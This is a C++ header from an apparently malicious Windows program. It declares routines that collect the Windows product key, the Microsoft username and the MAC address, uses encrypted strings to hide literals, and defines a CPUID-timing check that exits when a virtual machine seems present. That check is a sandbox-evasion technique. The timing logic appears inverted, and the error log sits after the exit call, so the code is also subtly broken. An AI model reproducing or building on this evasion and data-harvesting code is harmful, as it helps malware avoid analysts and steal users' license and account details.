//
// Created by arteii on 11/3/24.
//

#ifndef SYSTEMINFO_HPP
#define SYSTEMINFO_HPP

#include "src/modules/ApplicationController/ApplicationController.hpp"
#include <StringEncryptionUtils.hpp>

#include <array>
#include <chrono>
#include <string>
#include <tuple>
#include <windows.h>

namespace WinInfo {

auto
Version() -> std::tuple<const ULONG, const ULONG, const ULONG>;

auto
GetMacAddress() -> std::string;

auto
GetWindowsProductKey() -> std::string;

auto
GetMicrosoftUsername() -> std::string;

auto
GenerateSecureIdentifier() -> std::string;

// Helper function to read the CPUID instruction
inline auto
Cpuid(const int32_t* const cpuInfo, int functionId) -> void
{
  auto* mutableCpuInfo = const_cast<int32_t*>(cpuInfo);
  __asm__ __volatile__("cpuid"
                       : "=a"(mutableCpuInfo[0]),
                         "=b"(mutableCpuInfo[1]),
                         "=c"(mutableCpuInfo[2]),
                         "=d"(mutableCpuInfo[3])
                       : "a"(functionId));
}

/// Exits if Vm was detected
///
/// Current Checks:
/// - CPUID Execution time (Threshold)
inline auto
CheckVm() -> void
{
  constexpr int cpuidFunc = 0; // CPUID function to query basic info
  constexpr int threshold = 1000;
  constexpr double microsecondsPerSecond = 1.0e6;

  std::array<int32_t, 4> cpuInfo;

  const auto start = std::chrono::high_resolution_clock::now();
  Cpuid(cpuInfo.data(), cpuidFunc);
  const auto end = std::chrono::high_resolution_clock::now();

  if (const std::chrono::duration<double> duration = end - start;
      duration.count() * microsecondsPerSecond < threshold) {
    ApplicationController::ImmediateExit();
    LOG_ERROR(SECURE_STR("VM Detected, exiting immediately."));
  }
}

auto
GetDesktopPathFromRegistry() -> std::wstring;

auto
DesktopDirectory() -> LPCWSTR;

} // namespace WinInfo

#endif // SYSTEMINFO_HPP
